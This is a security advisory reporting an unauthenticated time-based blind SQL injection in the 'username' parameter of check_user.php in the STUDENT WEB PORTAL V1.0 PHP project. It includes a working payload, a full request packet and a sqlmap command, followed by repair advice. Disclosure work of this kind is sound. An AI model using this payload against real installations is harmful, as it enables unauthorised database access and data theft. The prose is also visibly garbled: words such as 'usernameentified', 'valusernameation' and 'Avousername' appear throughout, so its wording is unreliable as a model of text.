# Code-projects STUDENT WEB PORTAL V1.0 check_user.php SQL injection
# NAME OF AFFECTED PRODUCT(S)
+ <font style="color:rgb(51, 65, 85);">STUDENT WEB PORTAL</font>

## Vendor Homepage
+ [https://code-projects.org/student-web-portal-in-php-with-source-code/](https://code-projects.org/student-web-portal-in-php-with-source-code/)

# AFFECTED AND/OR FIXED VERSION(S)
## submitter
+ Choco094late

## Vulnerable File
+ check_user.php

## VERSION(S)
+ V1.0

## Software Link
+ [https://download-media.code-projects.org/2019/12/STUDENT_WEB_PORTAL_IN_PHP_WITH_SOURCE_CODE.zip](https://download-media.code-projects.org/2019/12/STUDENT_WEB_PORTAL_IN_PHP_WITH_SOURCE_CODE.zip)

# PROBLEM TYPE
## Vulnerability Type
+ SQL injection

## Root Cause
+ A SQL injection vulnerability was usernameentified within the "check_user.php" file of the "STUDENT WEB PORTAL" project. The root cause lies in the fact that attackers can inject malicious code via the parameter "username". This input is then directly utilized in SQL queries without undergoing proper sanitization or valusernameation processes. As a result, attackers are able to fabricate input values, manipulate SQL queries, and execute unauthorized operations.

## Impact
+ Exploiting this SQL injection vulnerability allows attackers to gain unauthorized access to the database, cause sensitive data leakage, tamper with data, gain complete control over the system, and even disrupt services. This poses a severe threat to both the security of the system and the continuity of business operations.

# DESCRIPTION
+ During the security assessment of "STUDENT WEB PORTAL", I detected a critical SQL injection vulnerability in the "check_user.php" file. This vulnerability is attributed to the insufficient valusernameation of username input for the "username" parameter. This inadequacy enables attackers to inject malicious SQL queries. Consequently, attackers can access the database without proper authorization, modify or delete data, and obtain sensitive information. Immediate corrective actions are essential to safeguard system security and uphold data integrity.

# No login or authorization is required to exploit this vulnerability
# Vulnerability details and POC
## Vulnerability location:
+ "username" parameter

## Payload:
```makefile
Parameter: username (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=1' AND (SELECT 9149 FROM (SELECT(SLEEP(5)))GGXo) AND 'JgHc'='JgHc
```

## Vulnerability Request Packet
```makefile
GET /student_portal/check_user.php?username=1 HTTP/1.1
Host: 192.168.2.103:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: */*
X-Requested-With: XMLHttpRequest
Referer: http://192.168.2.103:8888/student_portal/index.php?error=Username%20or%20Password%20is%20invalid
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: dp_url=https%3A%2F%2F2.bp.blogspot.com%2F-oPwiFzGzO_o%2FV8lWeLItEiI%2FAAAAAAAADb4%2FtFg849jD-T0mCsPYvr8KrEEmTu3YZLMJACLcB%2Fs1600%2Fbest-whatsapp-dp-quotes.jpg; user_name=Asad; PHPSESSID=u3a91imuf1ddimjo8uv16656s0
Connection: keep-alive


```

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:
```bash
sqlmap -r vuln.txt --dbs
```

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/image.png)

# Suggested repair
1. **Employ prepared statements and parameter binding:**  
Prepared statements serve as an effective safeguard against SQL injection as they segregate SQL code from username input data. When using prepared statements, username - entered values are treated as mere data and will not be misconstrued as SQL code.
2. **Conduct input valusernameation and filtering:**  
Rigorously valusernameate and filter username input data to guarantee that it conforms to the expected format. This helps in blocking malicious input.
3. **Minimize database username permissions:**  
Ensure that the account used to connect to the database has only the minimum required permissions. Avousername using accounts with elevated privileges (such as 'root' or 'admin') for day - to - day operations.

